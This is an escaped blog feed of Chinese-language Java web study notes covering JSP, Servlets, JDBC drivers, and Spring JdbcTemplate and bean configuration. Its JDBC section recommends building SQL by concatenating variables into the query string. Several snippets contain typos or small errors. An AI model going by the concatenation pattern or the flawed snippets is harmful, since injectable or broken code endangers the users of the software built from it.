version&#x3D;&quot;4&quot;&gt;</span><br><span class="line">  &lt;component name&#x3D;&quot;FacetManager&quot;&gt;</span><br><span class="line">    &lt;facet type&#x3D;&quot;web&quot; name&#x3D;&quot;Web&quot;&gt;</span><br><span class="line">      &lt;configuration&gt;</span><br><span class="line">        &lt;descriptors&gt;</span><br><span class="line">          &lt;deploymentDescriptor name&#x3D;&quot;web.xml&quot; url&#x3D;&quot;file:&#x2F;&#x2F;$MODULE_DIR$&#x2F;web&#x2F;WEB-INF&#x2F;web.xml&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;descriptors&gt;</span><br><span class="line">        &lt;webroots&gt;</span><br><span class="line">          &lt;root url&#x3D;&quot;file:&#x2F;&#x2F;$MODULE_DIR$&#x2F;web&quot; relative&#x3D;&quot;&#x2F;&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;webroots&gt;</span><br><span class="line">        &lt;sourceRoots&gt;</span><br><span class="line">          &lt;root url&#x3D;&quot;file:&#x2F;&#x2F;$MODULE_DIR$&#x2F;src&#x2F;main&#x2F;java&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;sourceRoots&gt;</span><br><span class="line">      &lt;&#x2F;configuration&gt;</span><br><span class="line">    &lt;&#x2F;facet&gt;</span><br><span class="line">  &lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;module&gt;</span><br></pre></td></tr></table></figure><h3 id="一般maven中依赖文件夹内需要的文件"><a href="#一般maven中依赖文件夹内需要的文件" class="headerlink" title="## 一般maven中依赖文件夹内需要的文件"></a>## 一般maven中依赖文件夹内需要的文件</h3><p>一个.jar和一个.pom文件, 注意自己手动下载时修改文件名时确认好</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/jsp</title>
      <link href="java/jsp/"/>
      <url>java/jsp/</url>
      
        <content type="html"><![CDATA[<h1 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h1><a id="more"></a><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>knowledge</p><p>Tomcat 访问任何的资源都是在访问Servlet</p><p>JSP第一次被访问时候会被编译为HttpJspPage类（该类是HttpServlet 的一个子类）</p><p>JSP本身就是一种Servlet ， jsp比serlvlet 更方便见简单的一个重要原因就是：内置了9个对象！</p><p>内置对象有：out、session、response、request、config、page、application、pageContext、exception</p><h3 id="out-print-out-write"><a href="#out-print-out-write" class="headerlink" title="out.print() out.write()"></a>out.print() out.write()</h3><p>out.print(97) 打印的<strong>97</strong>都为字符串， </p><p>out.wite(97)打印的为ASCII表中的字符a</p><h3 id="getParameter"><a href="#getParameter" class="headerlink" title="getParameter"></a>getParameter</h3><p>getParameter得到的都是String类型的。或者是用于读取提交的表单中的值（<a href="http://a.jsp?id=123中的123），或者是某个表单提交过去的数据；" target="_blank" rel="noopener">http://a.jsp?id=123中的123），或者是某个表单提交过去的数据；</a><br>getAttribute则可以是对象Object，需进行转换,可用setAttribute设置成任意对象，使用很灵活，可随时用；</p><p>setAttribute 是应用服务器把这个对象放在该页面所对应的一块内存中去，当你的页面服务器重定向到另一个页面时，应用服务器会把这块内存拷贝另一个页面所对应的内存中。这样getAttribute就能取得你所设下的值，当然这种方法可以传对象。session也一样，只是对象在内存中的生命周期不一样而已。<br>getParameter只是应用服务器在分析你送上来的request页面的文本时，取得你设在表单或url重定向时的值。 </p><h3 id="jsp-getProperty"><a href="#jsp-getProperty" class="headerlink" title="jsp:getProperty"></a>jsp:getProperty</h3><p><a href="http://www.51gjie.com/javaweb/839.html" target="_blank" rel="noopener">jsp:getProperty</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/java_web</title>
      <link href="java/java_web/"/>
      <url>java/java_web/</url>
      
        <content type="html"><![CDATA[<h1 id="后端开发之路"><a href="#后端开发之路" class="headerlink" title="后端开发之路"></a>后端开发之路</h1><a id="more"></a><h2 id="Servlet-基础"><a href="#Servlet-基础" class="headerlink" title="Servlet 基础"></a>Servlet 基础</h2><p>Servlet规范描述了Http请求以及响应处理过程相关的对象及其作用。</p><h3 id="Servlet-过滤器"><a href="#Servlet-过滤器" class="headerlink" title="Servlet 过滤器"></a>Servlet 过滤器</h3><p>为特定的URL请求添加过滤器，</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">``</span>filter<span class="string">``</span>&gt;</span><br><span class="line">  <span class="string">``</span>&lt;<span class="string">``</span>filter-name<span class="string">``</span>&gt;LoggingFilter&lt;/<span class="string">``</span>filter-name<span class="string">``</span>&gt;</span><br><span class="line">  <span class="string">``</span>&lt;<span class="string">``</span>filter-<span class="keyword">class</span><span class="string">``</span>&gt;LoggingFilter&lt;/<span class="string">``</span>filter-<span class="keyword">class</span><span class="string">``</span>&gt;</span><br><span class="line">&lt;/<span class="string">``</span>filter<span class="string">``</span>&gt;</span><br><span class="line">&lt;<span class="string">``</span>filter-mapping<span class="string">``</span>&gt;</span><br><span class="line">  <span class="string">``</span>&lt;<span class="string">``</span>filter-name<span class="string">``</span>&gt;LogingFilter&lt;/<span class="string">``</span>filter-name<span class="string">``</span>&gt;</span><br><span class="line">  <span class="string">``</span>&lt;<span class="string">``</span>url-pattern<span class="string">``</span>&gt;<span class="comment">/*&lt;/``url-pattern``&gt;</span></span><br><span class="line"><span class="comment">&lt;/filter-mapping``&gt;</span></span><br></pre></td></tr></table></figure><h3 id="侦听Servlet容器事件"><a href="#侦听Servlet容器事件" class="headerlink" title="侦听Servlet容器事件"></a>侦听Servlet容器事件</h3><p>创建一个基于容器事件执行操作的侦听器，必须开发一个实现该ServletContextListemer接口的类。</p><p>需要实现的方法是contextInitialized()和contextDestoryed()</p><p>要向容器注册侦听器，可以使用以下技术之一：</p><p>1）利用<code>@WebListener</code>注释。<br>2）在web.xml应用程序部署描述符中注册侦听器。<br>3）使用上<code>addListener()</code>定义的方法<code>ServletContext</code>。</p><p>请注意，<code>ServletContextListener</code>它不是Servlet API中的唯一列表器。还有更多例如</p><ul><li>javax.servlet.ServletRequestListener</li><li>javax.servlet.ServletRequestAttrbiteListener</li><li>javax.servlet.ServletContextListener</li><li>javax.servlet.ServletContextAttributeListener</li><li>javax.servlet.HttpSessionListener</li><li>javax.servlet.HttpSessionAttributeListener</li></ul><p>可以由列表器类根据想听事件的类型来选择实现，HttpSessionListenser每次创建或销毁新用户会话时，都会收到通知</p><h3 id="将请求转发到另一个Servlet"><a href="#将请求转发到另一个Servlet" class="headerlink" title="将请求转发到另一个Servlet"></a>将请求转发到另一个Servlet</h3><h4 id="使用RequestDispatcher-forward"><a href="#使用RequestDispatcher-forward" class="headerlink" title="使用RequestDispatcher.forward()"></a>使用RequestDispatcher.forward()</h4><p>有时，您的应用程序要求servlet应该将请求移交给其他servlet，以完成需要完成的任务。此外，应在不将客户端重定向到另一个URL的情况下移交请求，即浏览器中的URL不应更改。</p><p>这样做的功能就内置在中<code>ServletContext</code>，因此一旦获得对的引用<code>ServletContext</code>，则只需调用该<code>getRequestDispatcher()</code>方法即可获得一个RequestDispatcher对象，该对象可用于调度请求。调用该<code>getRequestDispatcher()</code>方法时，传递一个String，其中包含要将您的请求传递到的servlet的名称。<code>RequestDispatcher</code>获取对象后，通过将<code>HttpServletRequest</code>和<code>HttpServletResponse</code>对象传递给它来调用其前向方法。转发方法执行移交请求的任务。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RequestDispatcher rd = servletContext.getRequestDispatcher(<span class="string">"/NextServlet"</span>);</span><br><span class="line">rd.forward(request,response);</span><br></pre></td></tr></table></figure><h4 id="使用HttpServletResponse-sendRedirect"><a href="#使用HttpServletResponse-sendRedirect" class="headerlink" title="使用HttpServletResponse.sendRedirect()"></a>使用HttpServletResponse.sendRedirect()</h4><p>当您访问应用程序中的特定URL时，想将浏览器重定向到另一个URL。 </p><p>为此，将需要调用HttpServletResponse object的sendRedirect()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpServletResponse,sendredirect(<span class="string">"/anotherURL"</span>);</span><br></pre></td></tr></table></figure><p>于servlet链接相反，这种简单的重定向不会将HttpRequest对象传递到目标地址</p><h3 id="Servlet编写和读取cookie"><a href="#Servlet编写和读取cookie" class="headerlink" title="Servlet编写和读取cookie"></a>Servlet编写和读取cookie</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">"sessionId"</span>,<span class="string">"123456789"</span>);</span><br><span class="line">cookie.setHttpOnly(<span class="keyword">true</span>);</span><br><span class="line">cookie.setMaxAge(-<span class="number">30</span>);</span><br><span class="line">response.addCookie(cookie);</span><br></pre></td></tr></table></figure><p>响应HttpServletResponse 传递给doXXX()方法的实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Cookie[] cookies = request.getCookies();</span><br><span class="line"><span class="keyword">for</span>(Cookie cookie : cookies)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//cookie.getName();</span></span><br><span class="line">    <span class="comment">//cookie.getValue()</span></span><br><span class="line">&#125;  <span class="comment">//回读服务器父项上的cookie信息</span></span><br></pre></td></tr></table></figure><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><h3 id="驱动程序"><a href="#驱动程序" class="headerlink" title="驱动程序"></a>驱动程序</h3><p>四种类型驱动程序</p><ul><li>JDBC-ODBC桥驱动程序  //有纯Java驱动程序替代的话，不建议此</li><li>本机API驱动程序</li><li>所有Java+中间件翻译驱动程序</li><li>纯Java驱动程序</li></ul><h4 id="本机API驱动程序"><a href="#本机API驱动程序" class="headerlink" title="本机API驱动程序"></a>本机API驱动程序</h4><p>JDBC驱动程序类似于类型1驱动程序，不同之处在于<strong>ODBC部分被替换为本机代码部分</strong>。本机代码部分针对特定的数据库产品，即使用数据库产品的客户端库。驱动程序将JDBC方法调用转换为数据库本机API的本机调用。</p><p>这种体系结构消除了对ODBC驱动程序的需求，而直接称为数据库供应商提供的本机客户端库。数据库供应商很快就采用了这种方法，因为它可以快速，廉价地实现，因为他们可以重用现有的基于C / C ++的本机库。</p><h4 id="所有Java-中间件翻译驱动程序"><a href="#所有Java-中间件翻译驱动程序" class="headerlink" title="所有Java+ 中间件翻译驱动程序"></a>所有Java+ 中间件翻译驱动程序</h4><p> JDBC驱动程序是一种全Java驱动程序，它将<strong>JDBC接口调用发送到中间服务器</strong>。然后，中间服务器代表JDBC驱动程序连接到数据库。中间层（应用程序服务器）将JDBC调用直接或间接转换为供应商特定的数据库协议。</p><p>Type 3驱动程序试图成为100％Java解决方案，但并没有真正获得太大的吸引力。Type 3驱动程序具有Java客户端组件和Java Server组件，后者实际上是在与数据库对话。尽管从技术上讲这是一个完整的Java解决方案，但是数据库供应商不喜欢这种方法，因为这种方法成本高昂–他们将不得不重写全部为C / C ++的本机客户端库。另外，这并没有提高体系结构的效率，因为我们实际上仍然是3层体系结构，因此很容易看出为什么它从来都不是流行的选择。</p><p><img src="../images/java_web/JDBC-driver-type-3.png" alt="JDBC驱动程序类型3"></p><h4 id="纯Java驱动程序"><a href="#纯Java驱动程序" class="headerlink" title="纯Java驱动程序"></a>纯Java驱动程序</h4><p><img src="../images/java_web/JDBC-driver-type-4.png" alt="JDBC驱动程序类型4"></p><p>JDBC 4类驱动程序，也称为直接数据库纯Java驱动程序，是一种数据库驱动程序实现，可<strong>将JDBC调用直接转换为特定于供应商的数据库协议</strong>。它是针对特定数据库产品实现的。如今，大多数JDBC驱动程序都是4类驱动程序。</p><p>Type 4驱动程序完全用Java编写，因此与平台无关。它们安装在客户端的Java虚拟机内部。这提供了比类型1和类型2驱动程序更好的性能，因为它没有将调用转换为ODBC或数据库API调用的开销。与类型3驱动程序不同，它不需要关联的软件即可工作。</p><p>该体系结构将整个JDBC API实现以及用于直接与数据库通信的所有逻辑封装在<br>单个驱动程序中。通过在100％java程序包中都包含一个单独的层和一个小的驱动程序，这可以简化部署并简化开发过程。</p><p>例如，这种类型包括广泛使用的Oracle瘦驱动程序。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>java使用Stament对象使用execute()方法传递sql语句时，sql语句用的是” “ 字符串式，所以在用value传递参数时，不能直接将id，age这样的变量直接使用</p><p>需要 ‘“+id +”‘,’”user”  这样的形式将变量传递进，否则则将传进空值 </p><p>jdbc中insert语句 例</p><p>或者用字符串拼接的方法传递参数，例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">statement.execute(String.format(<span class="string">"INSERT INTO employees(id,age,first,last)"</span>+<span class="string">"VALUES('"</span>+ id +<span class="string">"', '"</span>+age +<span class="string">"','"</span>+first +<span class="string">"','"</span>+last+<span class="string">"')"</span>));</span><br></pre></td></tr></table></figure><p>注意VALUE 前有双引号，一条语句分开 双引号 </p><h3 id="Spring-中JdbcTemplate-类"><a href="#Spring-中JdbcTemplate-类" class="headerlink" title="Spring 中JdbcTemplate 类"></a>Spring 中JdbcTemplate 类</h3><p>JDBC模板类执行SQL查询,更新语句,存储过程调用 , 对ResultSet执行迭代并提取返回的参数值, 它还捕获JDBC异常并将其转换为org.springframework.dao包中定义的通用,信息量更大的异常层次结构 </p><p>配置后, JdbcTemplate类的实例时线程安全的,因此,可以配置JdbcTemplate 的单个实例,然后安全地将此共享引用注入到多个DAO中</p><p>需要为JDBC模板提供一个数据源, 使得它可以对其进行配置以获取数据库访问权限, 可以是在XML文件中配置DataSource ,</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"dataSource"</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">class</span> = <span class="string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"driverClassName"</span> <span class="attr">value</span> = <span class="string">"com.mysql.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"url"</span> <span class="attr">value</span> = <span class="string">"jdbc:mysql://localhost:3306/TEST"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"username"</span> <span class="attr">value</span> = <span class="string">"root"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"password"</span> <span class="attr">value</span> = <span class="string">"password"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span></span></span><br></pre></td></tr></table></figure><h4 id="数据访问对象-DAO"><a href="#数据访问对象-DAO" class="headerlink" title="数据访问对象(DAO)"></a>数据访问对象(DAO)</h4><p>DAO代表数据访问对象,通常用于数据库交互,DAO的存在</p><p>执行sql语句</p><p>查询整数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String Sql = <span class="string">"select count(*) from Student"</span>;<span class="string">'</span></span><br><span class="line"><span class="string">int rowCount = jdbcTemplateObject.queryForInt(Sql);</span></span><br></pre></td></tr></table></figure><p><strong>查询很长时间</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String SQL = <span class="string">"select count(*) from Student"</span><span class="comment">;</span></span><br><span class="line">long rowCount = jdbcTemplateObject.queryForLong( SQL )<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><strong>使用绑定变量的简单查询</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">SQL</span> = "select age from Student where id = ?";</span><br><span class="line"><span class="type">int</span> age = jdbcTemplateObject.queryForInt(<span class="keyword">SQL</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;<span class="number">10</span>&#125;);</span><br></pre></td></tr></table></figure><p><strong>查询字符串</strong></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span> SQL = <span class="string">"select name from Student where id = ?"</span>;</span><br><span class="line"><span class="built_in">String</span> name = jdbcTemplateObject.queryForObject(SQL, <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="number">10</span>&#125;, <span class="built_in">String</span><span class="class">.<span class="keyword">class</span>);</span></span><br></pre></td></tr></table></figure><p><strong>查询和返回对象</strong></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> SQL = <span class="string">"select * from Student where id = ?"</span>;</span><br><span class="line">Student student = jdbcTemplateObject.queryForObject(</span><br><span class="line">   SQL, <span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="number">10</span>&#125;, <span class="keyword">new</span> <span class="type">StudentMapper</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentMapper</span> <span class="keyword"><span class="keyword">implements</span> <span class="type">RowMapper</span></span>&lt;<span class="title">Student</span>&gt; </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> Student mapRow(ResultSet rs, int rowNum) throws SQLException &#123;</span><br><span class="line">      Student student = <span class="keyword">new</span> <span class="type">Student</span>();</span><br><span class="line">      student.setID(rs.getInt(<span class="string">"id"</span>));</span><br><span class="line">      student.setName(rs.getString(<span class="string">"name"</span>));</span><br><span class="line">      student.setAge(rs.getInt(<span class="string">"age"</span>));</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> student;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>查询并返回多个对象</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String SQL = <span class="string">"select * from Student"</span>;</span><br><span class="line">List&lt;Student&gt; students = jdbcTemplateObject.query(</span><br><span class="line">   SQL, <span class="keyword">new</span> <span class="constructor">StudentMapper()</span>);</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> StudentMapper implements RowMapper&lt;Student&gt; &#123;</span><br><span class="line">   public Student map<span class="constructor">Row(ResultSet <span class="params">rs</span>, <span class="params">int</span> <span class="params">rowNum</span>)</span> throws SQLException &#123;</span><br><span class="line">      Student student = <span class="keyword">new</span> <span class="constructor">Student()</span>;</span><br><span class="line">      student.set<span class="constructor">ID(<span class="params">rs</span>.<span class="params">getInt</span>(<span class="string">"id"</span>)</span>);</span><br><span class="line">      student.set<span class="constructor">Name(<span class="params">rs</span>.<span class="params">getString</span>(<span class="string">"name"</span>)</span>);</span><br><span class="line">      student.set<span class="constructor">Age(<span class="params">rs</span>.<span class="params">getInt</span>(<span class="string">"age"</span>)</span>);</span><br><span class="line">      </span><br><span class="line">      return student;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在表格中插入一行</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">SQL</span> = "insert into Student (name, age) values (?, ?)";</span><br><span class="line">jdbcTemplateObject.<span class="keyword">update</span>( <span class="keyword">SQL</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"Zara", <span class="number">11</span>&#125; );</span><br></pre></td></tr></table></figure><p><strong>更新表中的一行</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">SQL</span> = "update Student set name = ? where id = ?";</span><br><span class="line">jdbcTemplateObject.<span class="keyword">update</span>( <span class="keyword">SQL</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;"Zara", <span class="number">10</span>&#125; );</span><br></pre></td></tr></table></figure><p><strong>从表格中删除一行</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">SQL</span> = "delete Student where id = ?";</span><br><span class="line">jdbcTemplateObject.<span class="keyword">update</span>( <span class="keyword">SQL</span>, <span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;<span class="number">20</span>&#125; );</span><br></pre></td></tr></table></figure><p>执行DDL语句</p><p>您可以使用<em>jdbcTemplate中</em>的<strong>execute（..）</strong>方法执行任何SQL语句或DDL语句。以下是使用CREATE语句创建表的示例-</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String SQL = "<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Student( <span class="string">" +</span></span><br><span class="line"><span class="string">   "</span><span class="keyword">ID</span>   <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT, <span class="string">" +</span></span><br><span class="line"><span class="string">   "</span><span class="keyword">NAME</span> <span class="built_in">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>, <span class="string">" +</span></span><br><span class="line"><span class="string">   "</span>AGE  <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>, <span class="string">" +</span></span><br><span class="line"><span class="string">   "</span>PRIMARY <span class="keyword">KEY</span> (<span class="keyword">ID</span>));"</span><br><span class="line"></span><br><span class="line">jdbcTemplateObject.execute( <span class="keyword">SQL</span> );</span><br></pre></td></tr></table></figure><h2 id="从Spring开始学SpringBoot"><a href="#从Spring开始学SpringBoot" class="headerlink" title="从Spring开始学SpringBoot"></a>从Spring开始学SpringBoot</h2><p>Spring的环境配过并解决了一些问题，但仅运行了hello boot 的示例程序</p><p>因为没有系统的学习spring，仅仅听了一遍视频，没有任何记忆，所以参考学习网站将Spring的一些基础知识点系统学习并进行记录</p><h3 id="bean-标签的使用"><a href="#bean-标签的使用" class="headerlink" title="bean 标签的使用"></a>bean 标签的使用</h3><h4 id="bean使用的第一个example程序"><a href="#bean使用的第一个example程序" class="headerlink" title="bean使用的第一个example程序"></a>bean使用的第一个example程序</h4><p><bean>中的bean id 返回调用类的对象，并使用 <property/>标签为变量传递值</p><p>例 HelloSpring类为 bean标签内的类  bean id返回HelloSpring类对象传递给HelloSpring variable_name</p><p>variable_name将可以调用HelloSpring类中方法</p><p>bean id标签通过类内函数为类成员变量赋值</p><p><img src="../images/java_web/image-20210403204446620.png" alt="image-20210403204446620"></p><p><img src="../images/java_web/image-20210403204453493.png" alt="image-20210403204453493"></p><p>message将赋值为”Hello Spring”</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>构成应用程序主干并由Spring IoC容器管理的对象成为bean，Bean是由Spring IoC容器示例化，组装和以其他方式管理的对象。</p><p>属性和说明</p><table><thead><tr><th>序号</th><th>属性和说明</th></tr></thead><tbody><tr><td>1  class 类</td><td>必须的，用于指定创建Bean的类</td></tr><tr><td>2 name 姓名</td><td>此属性唯一地指示Bean标识符。在基于XML的配置元数据中，使用id和/或name属性来指定Bean 标识符</td></tr><tr><td>3 scope 范围</td><td>指定从特定bean 定义创建的对象的范围</td></tr><tr><td>4 constructor-arg 构造函数</td><td></td></tr><tr><td>5 properties 特性</td><td></td></tr><tr><td>6 autpwiring mode 自动连线模式</td><td></td></tr><tr><td>7 lazy-initalization mode 延迟初始化模式</td><td></td></tr><tr><td>8 initalization mehtod 初始化方法</td><td>容器设置完Bean的所有必须属性后，将调用此回调</td></tr><tr><td>9 destruction mehtod 销毁方法</td><td></td></tr></tbody></table><h4 id="Scopes"><a href="#Scopes" class="headerlink" title="Scopes"></a>Scopes</h4><p>强制Spring每次需要一个新的bean实例时，将scope属性声明为prototype，</p><p>Spring每次需要一个实例时都返回一个实例时都返回相同的bean实例，则scope属性声明为singleton</p><table><thead><tr><th>Sr.No.</th><th>Scope &amp; Description</th></tr></thead><tbody><tr><td>1</td><td><strong>singleton</strong>This scopes the bean definition to a single instance per Spring IoC container (default).</td></tr><tr><td>2</td><td><strong>prototype</strong>This scopes a single bean definition to have any number of object instances.</td></tr><tr><td>3</td><td><strong>request</strong>This scopes a bean definition to an HTTP request. Only valid in the context of a web-aware Spring ApplicationContext.</td></tr><tr><td>4</td><td><strong>session</strong>This scopes a bean definition to an HTTP session. Only valid in the context of a web-aware Spring ApplicationContext.</td></tr><tr><td>5</td><td><strong>global-session</strong>This scopes a bean definition to a global HTTP session. Only valid in the context of a web-aware Spring ApplicationContext.</td></tr></tbody></table><h5 id="单例范围"><a href="#单例范围" class="headerlink" title="单例范围"></a>单例范围</h5><p>如果将范围设置为单例，则Spring IoC容器将创建该bean定义所定义的对象的一个实例。该单个实例存储在此类单例bean的高速缓存中，并且对该命名bean的所有后续请求和引用都返回该高速缓存的对象。</p><h4 id="bean生命周期"><a href="#bean生命周期" class="headerlink" title="bean生命周期"></a>bean生命周期</h4><p>定于bean的setup and teardown ，使用initmethod和/或destroy-method参数声明<bean></p><h5 id="初始化回调"><a href="#初始化回调" class="headerlink" title="初始化回调"></a>初始化回调</h5><p>org.springframework.beans.factory.InitializingBean接口指定一个方法-</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure><p>可以创建一个类去实现Initializing。并且可以在afterPropertiesSet()方法内部完成初始化工作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleBean</span> <span class="keyword">implements</span> <span class="title">InitializingBean</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// do some initialization work</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于基于XML的配置元数据，可以使用init-method属性指定具有无效无参数签名的方法的名称</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"exampleBean"</span> <span class="attr">class</span> = <span class="string">"examples.ExampleBean"</span> <span class="attr">init-method</span> = <span class="string">"init"</span>/&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleBean</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//do some initialization work</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="销毁回调"><a href="#销毁回调" class="headerlink" title="销毁回调"></a>销毁回调</h5><p>所述<em>org.springframework.beans.factory.DisposableBean</em>接口指定一个单一的方法-</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure><p>因此，您可以简单地实现上述接口，并且可以在destroy（）方法内完成终结工作，如下所示：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span 